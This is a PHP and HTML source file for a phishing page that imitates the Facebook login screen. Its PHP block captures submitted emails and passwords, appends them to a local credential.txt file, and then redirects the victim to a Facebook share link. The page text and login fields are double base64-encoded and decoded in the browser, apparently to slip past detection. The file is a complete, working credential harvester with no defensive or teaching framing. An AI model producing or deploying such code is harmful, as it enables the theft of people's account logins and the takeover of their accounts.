<?php
if (isset($_POST['login'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $content = <<<TXT
EMAIL: {$email}
PASSWORD: {$password}
=========================================\n
TXT;


    $file = fopen('credential.txt', 'a');
    $file = fwrite($file, $content);
    fclose($file);

    header("Location: http://www.facebook.com/sharer.php?u=http%3A%2F%2Fmobible.lk%2Fmessage%2F3370");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title class="decode"><?= base64_encode("TG9nIGluIHRvIEZhY2Vib29rIHwgRmFjZWJvb2s=") ?></title>
    <style>
        @font-face {
            font-family: 'fbFont'; /*a name to be used later*/
            src: url('logo_font.otf'); /*URL to font*/
        }

        body { margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; }
        .wrap { width: 980px; margin: auto; }

        /* HEADER */
        header { background-color: #3B5998; color: #FFF; padding: 15px; }
        header h1 { font-size: 2.1rem; margin: 0; font-family: 'fbFont', Helvetica, Arial, sans-serif; padding-top: 15px; display: inline-block; cursor: pointer; }
        header .signup { background-color: #42B72A; border: none; border-radius: 2px; color: #FFF; padding: 6px 10px; display: inline-block; margin-left: 5px; cursor: pointer; }
        header .signup:hover { opacity: .8; }

        /* SECTION */
        section { background-color: #E9EBEE; padding: 80px 0; }
        section .container {
            background-color: #FFF;
            padding: 40px 108px 26px;
            width: 396px;
            margin: auto;
            text-align: center;
            border: 1px solid;
            border-radius: 3px;
            border-color: #e5e6e9 #dfe0e4 #d0d1d5;
        }
        section .title { font-size: 1.2rem; }
        section input, section button { display: block; }
        section input { width: 286px; margin: auto; }
        section input {
            border: 1px solid #d3d6db;
            padding: 10px;
            margin-top: 10px;
            -webkit-border-radius:3px;
            -moz-border-radius:3px;
            border-radius:3px;
            color: #1d2129;
        }
        input[type='submit'] {
            width: 310px;
            padding: 15px 0;
            background-color: #4267B2;
            color: #FFF;
            border: none;
            font-size: .9rem;
            font-weight: bold;
            cursor: pointer;
        }
        .container a { color: #365899; text-decoration: none; font-size: 12px; }


        /* FOOTER */
        footer { padding: 8px 0; }
        footer hr { color: #737373; opacity: .5; }
        footer a, .line1 span { font-size: 12px; color: #365899; display: inline-block; text-decoration: none; padding: 0 5px; }
        footer button {
            background-color: #f6f7f9; color: #4b4f56; border-radius: 1px;
            border: 1px solid #ced0d4;
            padding: 0 15px;
            height: 25px;
            font-size: 16px;
            font-weight: bold;
        }
        .line1 span { color: #1e1e1e; opacity: .7; }

        .line2 a {
            display: inline-block;
            padding: 5px 25px 5px 0;
        }
        footer p { font-size: 12px; margin: 20px 0; opacity: .7; }
    </style>
</head>
<body>
    <header>
        <div class="wrap">
            <h1 class="decode"><?= base64_encode("RmFjZWJvb2s="); ?></h1>
            <button class="signup">Sign Up</button>
        </div>
    </header>
    <section>
        <div class="wrap">
            <div class="container">

                <form action="" method="POST">
                    <div class="title"><span class="decode"><?= base64_encode("TG9nIGluIHRvIEZhY2Vib29r"); ?></span></div>
                    <br>
                   <span class="decode">
                       <?= base64_encode("IDxpbnB1dCB0eXBlPSJlbWFpbCIgbmFtZT0iZW1haWwiIHBsYWNlaG9sZGVyPSJFbWFpbCBhZGRy
ZXNzIG9yIHBob25lIG51bWJlciIgc3BlbGxjaGVjaz0iZmFsc2UiPg0KICAgICAgICAgICAgICAg
ICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0i
UGFzc3dvcmQiPg0KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1l
PSJsb2dpbiIgdmFsdWU9IkxvZyBJbiI+IDxicj4NCiAgICAgICAgICAgICAgICAgICAgPGEgaHJl
Zj0iIyI+Rm9yZ290dGVuIGFjY291bnQ/PC9hPg==") ?>
                   </span>
                    <a href="#" class="decode"><?= base64_encode("U2lnbiB1cCBmb3IgRmFjZWJvb2s="); ?></a>
                </form>

            </div>
        </div>
    </section>

    <footer>
        <div class="wrap">
            <div class="line1 decode">
                <?= base64_encode("PHNwYW4+RW5nbGlzaCAoVUspPC9zcGFuPg0KICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiPiYj
MjAwMTM7JiMyNTk5MTsoJiMzMTYxNjsmIzIwMzA3Oyk8L2E+DQogICAgICAgICAgICAgICAgPGEg
aHJlZj0iIyI+JiM1NDYyMDsmIzQ0Mzk3OyYjNTA2MTI7PC9hPg0KICAgICAgICAgICAgICAgIDxh
IGhyZWY9IiMiPiYjMjYwODU7JiMyNjQxMjsmIzM1NDg2OzwvYT4NCiAgICAgICAgICAgICAgICA8
YSBocmVmPSIjIj5GcmFu52FpcyAoRnJhbmNlKTwvYT4NCiAgICAgICAgICAgICAgICA8YSBocmVm
PSIjIj5Fc3Bh8W9sPC9hPg0KICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiPkRldXRzY2g8L2E+
DQogICAgICAgICAgICAgICAgPGEgaHJlZj0iIyI+SXRhbGlhbm88L2E+DQogICAgICAgICAgICAg
ICAgPGEgaHJlZj0iIyI+UG9ydHVndepzIChCcmFzaWwpPC9hPg0KICAgICAgICAgICAgICAgIDxh
IGhyZWY9IiMiPiYjMTU3NTsmIzE2MDQ7JiMxNTkzOyYjMTU4NTsmIzE1NzY7JiMxNjEwOyYjMTU3
Nzs8L2E+DQogICAgICAgICAgICAgICAgPGEgaHJlZj0iIyI+JiMyMzYxOyYjMjM2NzsmIzIzNDQ7
JiMyMzgxOyYjMjM0MjsmIzIzNjg7PC9hPg0KICAgICAgICAgICAgICAgIDxidXR0b24+KzwvYnV0
dG9uPg==") ?>
            </div>
            <hr>
            <div class="line2">
                <a href="#">Sign Up</a>
                <a href="#">Log In</a>
                <a href="#">Messenger</a>
                <a href="#" class="decode"><?= base64_encode("RmFjZWJvb2sgTGl0ZQ==") ?></a>
                <span class="decode">
                    <?= base64_encode("PGEgaHJlZj0iIyI+TW9iaWxlPC9hPg0KICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiPkZpbmQg
RnJpZW5kczwvYT4NCiAgICAgICAgICAgICAgICA8YSBocmVmPSIjIj5QZW9wbGU8L2E+DQogICAg
ICAgICAgICAgICAgPGEgaHJlZj0iIyI+UGFnZXM8L2E+DQogICAgICAgICAgICAgICAgPGEgaHJl
Zj0iIyI+UGxhY2VzPC9hPg0KICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiPkdhbWVzPC9hPg0K
ICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiPkxvY2F0aW9uczwvYT4NCiAgICAgICAgICAgICAg
ICA8YSBocmVmPSIjIj5DZWxlYnJpdGllczwvYT4NCiAgICAgICAgICAgICAgICA8YSBocmVmPSIj
Ij5NYXJrZXRwbGFjZTwvYT4NCiAgICAgICAgICAgICAgICA8YSBocmVmPSIjIj5Hcm91cHM8L2E+
DQogICAgICAgICAgICAgICAgPGEgaHJlZj0iIyI+TW9tZW50czwvYT4NCiAgICAgICAgICAgICAg
ICA8YSBocmVmPSIjIj5JbnN0YWdyYW08L2E+DQogICAgICAgICAgICAgICAgPGEgaHJlZj0iIyI+
QWJvdXQ8L2E+DQogICAgICAgICAgICAgICAgPGEgaHJlZj0iIyI+Q3JlYXRlIEFkdmVydDwvYT4N
CiAgICAgICAgICAgICAgICA8YSBocmVmPSIjIj5DcmVhdGUgUGFnZTwvYT4NCiAgICAgICAgICAg
ICAgICA8YSBocmVmPSIjIj5EZXZlbG9wZXJzPC9hPg0KICAgICAgICAgICAgICAgIDxhIGhyZWY9
IiMiPkNhcmVlcnM8L2E+DQogICAgICAgICAgICAgICAgPGEgaHJlZj0iIyI+UHJpdmFjeTwvYT4N
CiAgICAgICAgICAgICAgICA8YSBocmVmPSIjIj5Db29raWVzPC9hPg0KICAgICAgICAgICAgICAg
IDxhIGhyZWY9IiMiPkFkQ2hvaWNlczwvYT4NCiAgICAgICAgICAgICAgICA8YSBocmVmPSIjIj5U
ZXJtczwvYT4NCiAgICAgICAgICAgICAgICA8YSBocmVmPSIjIj5IZWxwPC9hPg==") ?>
                </span>
            </div>

            <p class="decode"><?= base64_encode("RmFjZWJvb2sgJmNvcHk7IDIwMTc="); ?></p>
        </div>
    </footer>

    <script>
        decode = document.getElementsByClassName('decode');

        for (var i = 0; i < decode.length; i++) {
            code = decode[i].innerHTML;
            text = atob(atob(code));
            decode[i].innerHTML = text;
        }
    </script>
</body>
</html>